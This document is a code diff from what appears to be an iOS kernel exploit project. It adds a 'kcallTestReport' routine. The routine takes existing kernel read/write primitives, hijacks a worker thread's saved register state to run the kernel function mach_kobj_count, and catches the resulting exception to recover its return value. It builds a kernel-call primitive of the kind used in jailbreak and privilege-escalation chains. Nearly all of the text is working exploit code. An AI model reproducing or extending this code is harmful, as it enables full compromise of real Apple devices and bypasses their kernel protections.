@@ -48,6 +48,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 #import "exploit/krw_zone_write.h"  // clamped 0x20 writes — raw kwritebuf is 32-byte RMW
 #import "exploit/offsets.h"
 #import "TaskRop/pac.h"         // off_proc_ro_pr_task / off_task_map
+#import "TaskRop/rc.h"           // kp_arm_thread_state64_internal, KP_TH_IN_MACH_EXCEPTION
 
 static BOOL kpLooksLikeKernelPointer(uint64_t v)
 {
@@ -3636,6 +3637,121 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d P1=%d WROTE=%d HIT_DART=%d HIT_TYPE=0x%x SWAP_PTE=%d\n",
      (int)getuid(), (int)geteuid(), p1 ? 1 : 0, (int)wrote, (int)hitDart, hitType & 0xff, rbP == newPte ? 1 : 0];
     [r appendString:@"=== C3-WRITE done ===\n"];
+    return r;
+}
+
+// --- kcall test worker (file scope) ---
+static volatile int gKcStop = 0;
+static void *kpKcParkWorker(void *arg)
+{
+    (void)arg;
+    while (!gKcStop) usleep(2000);
+    return NULL;
+}
+
++ (NSString *)kcallTestReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== KCALL test: TH_IN_MACH_EXCEPTION + mach_kobj_count ===\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW не жив.\n"]; return r;
+    }
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; return r; }
+
+    extern bool kp_threadsetstate(mach_port_t, uint64_t, kp_arm_thread_state64_internal *);
+    extern mach_port_t kp_createexcport(void);
+    extern bool kp_waitexc(mach_port_t, kp_excmsg *, int);
+    extern uint64_t thread_get_kstackptr(uint64_t);
+
+    uint64_t target = ksymbol(mach_kobj_count);
+    kpNote(r, [NSString stringWithFormat:@"  ksymbol(mach_kobj_count)=%#llx", (unsigned long long)target]);
+    if (!target) {
+        [r appendString:@"FAIL: mach_kobj_count unresolved (XPF)\n"];
+        return r;
+    }
+
+    gKcStop = 0;
+    pthread_t wpt;
+    if (pthread_create(&wpt, NULL, kpKcParkWorker, NULL) != 0) {
+        [r appendString:@"FAIL: pthread_create\n"]; return r;
+    }
+    mach_port_t wport = pthread_mach_thread_np(wpt);
+    uint64_t threadVA = [self rcResolveThreadKVA:wport];
+    kpNote(r, [NSString stringWithFormat:@"  worker port=%#x thread_t=%#llx", wport, (unsigned long long)threadVA]);
+    if (!threadVA) {
+        gKcStop = 1; pthread_join(wpt, NULL);
+        [r appendString:@"FAIL: worker thread_t\n"]; return r;
+    }
+    // Validate thread belongs to our task (pac.m lesson).
+    uint64_t tro = kp_untag_ptr(early_kread64(threadVA + 0x3E8));
+    uint64_t wTask = tro ? kp_untag_ptr(early_kread64(tro + 0x28)) : 0;
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProofV2" log:r];
+    uint64_t pr = 0, tk = 0;
+    if (selfProc && kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "kcall proc_ro", r))
+        pr = kp_untag_ptr(pr);
+    if (pr && kpRead(pr + off_proc_ro_pr_task, &tk, 8, "kcall task", r))
+        tk = kp_untag_ptr(tk);
+    kpNote(r, [NSString stringWithFormat:@"  worker→task=%#llx selfTask=%#llx", (unsigned long long)wTask, (unsigned long long)tk]);
+    if (tk && wTask != tk) {
+        gKcStop = 1; pthread_join(wpt, NULL);
+        [r appendString:@"FAIL: worker не наш task — стоп\n"]; return r;
+    }
+
+    uint64_t kstack = thread_get_kstackptr(threadVA);
+    kpNote(r, [NSString stringWithFormat:@"  kstackptr=%#llx", (unsigned long long)kstack]);
+
+    mach_port_t excport = kp_createexcport();
+    if (!excport) {
+        gKcStop = 1; pthread_join(wpt, NULL);
+        [r appendString:@"FAIL: exc port\n"]; return r;
+    }
+    kern_return_t kr = thread_set_exception_ports(wport, EXC_MASK_ALL, excport,
+        EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+    kpNote(r, [NSString stringWithFormat:@"  exception_ports kr=%d", (int)kr]);
+
+    kp_arm_thread_state64_internal st;
+    memset(&st, 0, sizeof(st));
+    st.__pc = target;
+    st.__lr = 0x401; // KP_FAKE_LR — fault on return → exception
+    st.__sp = (kstack ? (kstack - 0x200) : 0) & ~0xFULL;
+    st.__x[0] = 0; st.__x[1] = 0;
+    kpNote(r, [NSString stringWithFormat:@"  setstate pc=%#llx lr=0x401 sp=%#llx", 
+              (unsigned long long)target, (unsigned long long)st.__sp]);
+
+    if (!kp_threadsetstate(wport, threadVA, &st)) {
+        mach_port_destruct(mach_task_self(), excport, 0, 0);
+        gKcStop = 1; pthread_join(wpt, NULL);
+        [r appendString:@"FAIL: thread_set_state\n"]; return r;
+    }
+    thread_resume(wport);
+
+    kp_excmsg exc;
+    memset(&exc, 0, sizeof(exc));
+    BOOL got = kp_waitexc(excport, &exc, 3000);
+    kpNote(r, [NSString stringWithFormat:@"  waitexc=%d exc=%u code=%#llx",
+              (int)got, exc.exception, (unsigned long long)exc.codeFirst]);
+    uint64_t x0 = got ? exc.threadState.__x[0] : 0;
+    uint64_t pcOut = got ? exc.threadState.__pc : 0;
+    kpNote(r, [NSString stringWithFormat:@"  x0=%#llx pc_out=%#llx", (unsigned long long)x0, (unsigned long long)pcOut]);
+    BOOL ok = got && x0 != 0;
+    kpNote(r, ok ? @"=== KCALL VALID ★★ (exception returned x0) ==="
+                 : @"=== KCALL no result (timeout / x0=0) ===");
+
+    // Cleanup — do not leave thread in kernel.
+    if (got) {
+        kp_arm_thread_state64_internal park;
+        memset(&park, 0, sizeof(park));
+        park.__pc = 0x401;
+        (void)kp_statereply(&exc, &park);
+    }
+    gKcStop = 1;
+    thread_terminate(wport);
+    pthread_detach(wpt); // may be stuck in kernel — do not join
+    mach_port_destruct(mach_task_self(), excport, 0, 0);
+
+    [r appendFormat:@"\n[VERIFY] KCALL=%d X0=%#llx PC=%#llx TARGET=%#llx\n",
+     ok ? 1 : 0, (unsigned long long)x0, (unsigned long long)pcOut, (unsigned long long)target];
     return r;
 }
 
